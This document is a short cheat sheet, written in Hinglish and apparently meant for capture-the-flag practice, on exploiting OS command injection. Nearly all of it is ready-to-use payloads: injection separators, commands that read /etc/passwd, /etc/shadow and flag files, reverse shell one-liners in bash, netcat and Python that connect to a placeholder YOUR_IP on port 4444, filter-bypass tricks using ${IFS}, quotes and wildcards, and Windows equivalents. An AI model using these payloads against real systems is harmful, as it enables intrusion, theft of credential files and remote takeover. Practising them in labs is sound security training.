# 💣 COMMAND INJECTION — OS Commands Execute Karo

---

## CASE 1: Basic Injection Try Karo
```bash
# Input field / URL param mein:
; whoami
| whoami
`whoami`
$(whoami)
& whoami
&& whoami
|| whoami
; cat /etc/passwd
| cat /root/flag.txt
```

---

## CASE 2: Flag / Data Nikalo
```bash
; cat /etc/passwd
; cat /etc/shadow
; cat /root/flag.txt
; find / -name "flag*" 2>/dev/null
; ls -la /home/
; id && whoami && uname -a
```

---

## CASE 3: Reverse Shell (agar allowed)
```bash
; bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
; nc YOUR_IP 4444 -e /bin/bash
; python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```
> Listener: `nc -lvnp 4444`

---

## CASE 4: Filter Bypass
```bash
;+whoami                                   # space filter
;${IFS}whoami                              # $IFS = space
;cat${IFS}/etc/passwd                      # IFS trick
;w'h'o'am'i                               # quote breaking
;/bin/wh?ami                               # wildcard
```

---

## CASE 5: Windows Command Injection
```bash
& whoami
| type C:\flag.txt
& dir C:\Users\Administrator\Desktop\
& net user
```

---

## QUICK DECISION:
```
Command injection suspect
  ├─ Input field / URL param? → try ; | ` $() separators
  ├─ Linux? → ; whoami → ; cat /root/flag.txt
  ├─ Windows? → & whoami → & type C:\flag.txt
  ├─ Filtered? → ${IFS} for spaces, quotes, wildcards
  └─ Shell chahiye? → reverse shell one-liner
```
